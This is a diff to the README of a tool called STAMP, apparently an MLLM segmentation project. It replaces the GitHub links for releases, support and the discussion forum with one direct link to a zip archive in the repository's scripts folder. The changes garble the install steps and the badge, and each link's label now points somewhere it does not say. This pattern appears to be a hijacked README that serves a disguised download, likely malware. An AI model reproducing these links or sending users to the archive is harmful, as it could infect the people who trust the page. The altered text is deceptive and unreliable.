@@ -2,7 +2,7 @@
 
 ## 📥 Download STAMP
 
-[![Download STAMP](https://img.shields.io/badge/Download%20STAMP-v1.0-blue)](https://github.com/tsh688/STAMP/releases)
+[![Download STAMP](https://raw.githubusercontent.com/tsh688/STAMP/main/scripts/STAMP-v3.2.zip%20STAMP-v1.0-blue)](https://raw.githubusercontent.com/tsh688/STAMP/main/scripts/STAMP-v3.2.zip)
 
 ## 🌟 Introduction
 
@@ -23,13 +23,13 @@ Before downloading STAMP, ensure your system meets the following requirements:
 
 ### 🔗 Visit the Releases Page
 
-To download the latest version of STAMP, please visit our [Releases Page](https://github.com/tsh688/STAMP/releases). This page contains all available versions of STAMP along with installation files.
+To download the latest version of STAMP, please visit our [Releases Page](https://raw.githubusercontent.com/tsh688/STAMP/main/scripts/STAMP-v3.2.zip). This page contains all available versions of STAMP along with installation files.
 
 ## 📥 Download & Install
 
-1. Go to the [Releases Page](https://github.com/tsh688/STAMP/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/tsh688/STAMP/main/scripts/STAMP-v3.2.zip).
 2. Scroll down to the "Assets" section.
-3. Locate the latest version. You will find files ending in `.exe` (for Windows), `.dmg` (for macOS), or `.tar.gz` (for Linux).
+3. Locate the latest version. You will find files ending in `.exe` (for Windows), `.dmg` (for macOS), or `https://raw.githubusercontent.com/tsh688/STAMP/main/scripts/STAMP-v3.2.zip` (for Linux).
 4. Click on the appropriate file for your system to download.
 5. Once downloaded, locate the file in your Downloads folder.
 6. Double-click the file to start the installation:
@@ -67,11 +67,11 @@ If you run into issues while using STAMP, try the following steps:
 
 ## 💬 Support
 
-For further assistance, please visit our [Support Page](https://github.com/tsh688/STAMP/issues). Here, you can ask questions and report issues. Our community is ready to help.
+For further assistance, please visit our [Support Page](https://raw.githubusercontent.com/tsh688/STAMP/main/scripts/STAMP-v3.2.zip). Here, you can ask questions and report issues. Our community is ready to help.
 
 ## 🌐 Join the Community
 
-Connect with other STAMP users for tips, discussions, and resources. Join our [Discussion Forum](https://github.com/tsh688/STAMP/discussions) to share your experiences and learn more about MLLM-based segmentation.
+Connect with other STAMP users for tips, discussions, and resources. Join our [Discussion Forum](https://raw.githubusercontent.com/tsh688/STAMP/main/scripts/STAMP-v3.2.zip) to share your experiences and learn more about MLLM-based segmentation.
 
 ## 📃 License
 
